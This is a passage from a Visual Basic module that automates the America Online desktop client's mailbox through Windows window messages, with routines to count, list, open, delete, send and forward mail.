    Call PostMessage(fList&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenEmailNew(index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& < index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenEmailOld(index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& < index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Sub MailOpenEmailSent(index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& < index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Public Function MailCountFlash() As Long
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    MailCountFlash& = count&
End Function
Public Sub MailToListFlash(thelist As ListBox)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim count As Long, MyString As String, AddMails As Long
    Dim sLength As Long, Spot As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    If fMail& = 0& Then Exit Sub
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    MyString$ = String(255, 0)
    For AddMails& = 0 To count& - 1
        DoEvents
        sLength& = SendMessage(fList&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(fList&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        MyString$ = ReplaceString(MyString$, Chr(0), "")
        thelist.AddItem MyString$
    Next AddMails&
End Sub
Public Function FindMailBox() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim TabControl As Long, TabPage As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    If TabControl& <> 0& And TabPage& <> 0& Then
        FindMailBox& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
            TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
            If TabControl& <> 0& And TabPage& <> 0& Then
                FindMailBox& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindMailBox& = 0&
End Function
Public Function MailCountNew() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountNew& = count&
End Function
Public Function MailCountSent() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountSent& = count&
End Function
Public Function MailCountOld() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountOld& = count&
End Function
Public Sub MailDeleteNewByIndex(index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If index& > count& - 1 Or index& < 0& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, index&, 0&)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailDeleteNewDuplicates(VBForm As Form, DisplayStatus As Boolean)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String, cSubject As String
    Dim SearchFor As Long, sSender As String, sSubject As String
    Dim CurCaption As String
    MailBox& = FindMailBox&
    CurCaption$ = VBForm.Caption
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0& Then Exit Sub
    For SearchFor& = 0& To count& - 2
        DoEvents
        sSender$ = MailSenderNew(SearchFor&)
        sSubject$ = MailSubjectNew(SearchFor&)
        If sSender$ = "" Then
            VBForm.Caption = CurCaption$
            Exit Sub
        End If
        For SearchBox& = SearchFor& + 1 To count& - 1
            If DisplayStatus = True Then
                VBForm.Caption = "Now checking #" & SearchFor& & " for match with #" & SearchBox&
            End If
            cSender$ = MailSenderNew(SearchBox&)
            cSubject$ = MailSubjectNew(SearchBox&)
            If cSender$ = sSender$ And cSubject$ = sSubject$ Then
                Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
                DoEvents
                Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
                DoEvents
                SearchBox& = SearchBox& - 1
            End If
        Next SearchBox&
    Next SearchFor&
    VBForm.Caption = CurCaption$
End Sub
Public Sub MailDeleteNewBySender(Sender As String)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0& Then Exit Sub
    For SearchBox& = 0& To count& - 1
        cSender$ = MailSenderNew(SearchBox&)
        If LCase(cSender$) = LCase(Sender$) Then
            Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
            DoEvents
            Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
            DoEvents
            SearchBox& = SearchBox& - 1
        End If
    Next SearchBox&
End Sub
Public Sub MailDeleteNewNotSender(Sender As String)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0& Then Exit Sub
    For SearchBox& = 0& To count& - 1
        cSender$ = MailSenderNew(SearchBox&)
        If cSender$ = "" Then Exit Sub
        If LCase(cSender$) <> LCase(Sender$) Then
            Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
            DoEvents
            Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
            DoEvents
            SearchBox& = SearchBox& - 1
        End If
    Next SearchBox&
End Sub
Public Function MailSenderFlash(index As Long) As String
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long, sLength As Long
    Dim MyString As String, Spot1 As Long, Spot2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < index& Then Exit Function
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    If fCount& = 0 Or index& > fCount& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(fList&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(fList&, LB_GETTEXT, index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderFlash$ = MyString$
End Function
Public Function MailSenderNew(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot1 As Long, Spot2 As Long, MyString As String
    Dim count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderNew$ = MyString$
End Function
Function MailStatus(numb As Integer) As String
parhand1& = FindWindow("AOL Frame25", "America  Online")
parhand2& = FindWindowEx(parhand1&, 0, "MDIClient", vbNullString)
parhand3& = FindWindowEx(parhand2&, 0, "AOL Child", vbNullString)
parhand4& = FindWindowEx(parhand3&, 0, "_AOL_TabControl", vbNullString)
ourparent& = FindWindowEx(parhand4&, 0, "_AOL_TabPage", vbNullString)
OurHandle% = FindWindowEx(ourparent&, 0, "_AOL_Tree", vbNullString)
X = SendMessage(OurHandle%, LB_SETCURSEL, numb, 0)
ClickStatus
Do: DoEvents
ourparent& = FindWindowEx(parhand2&, 0, "AOL Child", vbNullString)
OurHandle% = FindWindowEx(ourparent&, 0, "_AOL_View", vbNullString)
Loop Until OurHandle% <> 0
MailStatus$ = GetText(OurHandle%)
KillWin ourparent&
End Function
Public Function MailSubjectFlash(index As Long) As String
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long, sLength As Long
    Dim MyString As String, Spot As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < index& Then Exit Function
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    If fCount& = 0 Or index& > fCount& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(fList&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(fList&, LB_GETTEXT, index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectFlash$ = MyString$
End Function
Public Function MailSubjectNew(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectNew$ = MyString$
End Function
Public Sub MailToListNew(thelist As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Then Exit Sub
    For AddMails& = 0 To count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        thelist.AddItem MyString$
    Next AddMails&
End Sub
Public Sub MailToListOld(thelist As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Then Exit Sub
    For AddMails& = 0 To count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        thelist.AddItem MyString$
    Next AddMails&
End Sub
Public Sub MailToListSent(thelist As ListBox)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Then Exit Sub
    For AddMails& = 0 To count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, AddMails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, AddMails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        thelist.AddItem MyString$
    Next AddMails&
End Sub
Public Sub SendMail(Person As String, subject As String, message As String)
    Dim AOL As Long, MDI As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, OpenSend As Long, DoIt As Long
    Dim Rich As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, SendButton As Long
    Dim Combo As Long, fCombo As Long, ErrorWindow As Long
    Dim Button1 As Long, Button2 As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 13
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, Person$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, subject$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, message$)
    DoEvents
    Pause 0.2
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MailForward(SendTo As String, message As String, DeleteFwd As Boolean)
    Dim AOL As Long, MDI As Long, Error As Long
    Dim OpenForward As Long, OpenSend As Long, SendButton As Long
    Dim DoIt As Long, EditTo As Long, EditCC As Long
    Dim EditSubject As Long, Rich As Long, fCombo As Long
    Dim Combo As Long, Button1 As Long, Button2 As Long
    Dim TempSubject As String
    OpenForward& = FindForwardWindow
    If OpenForward& = 0 Then Exit Sub
    SendButton& = FindWindowEx(OpenForward&, 0&, "_AOL_Icon", vbNullString)
    For DoIt& = 1 To 6
        SendButton& = FindWindowEx(OpenForward&, SendButton&, "_AOL_Icon", vbNullString)
    Next DoIt&
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OpenSend& = FindSendWindow
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 13
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    If DeleteFwd = True Then
        TempSubject$ = GetText(EditSubject&)
        TempSubject$ = Right(TempSubject$, Len(TempSubject$) - 5)
        Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, TempSubject$)
        DoEvents
    End If
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, SendTo$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, message$)
    DoEvents
    Do Until OpenSend& = 0& Or Error& <> 0&
        DoEvents
        AOL& = FindWindow("AOL Frame25", vbNullString)
        MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
        Error& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        OpenSend& = FindSendWindow
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        For DoIt& = 1 To 11
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
        Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
        Pause 1
    Loop
    If OpenSend& = 0& Then Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub MailRemoveFwd()
Dim EditSubject As Long, EditTo As Long, EditCC As Long
Dim OpenSend As Long, TempSubject As String
OpenSend& = FindSendWindow
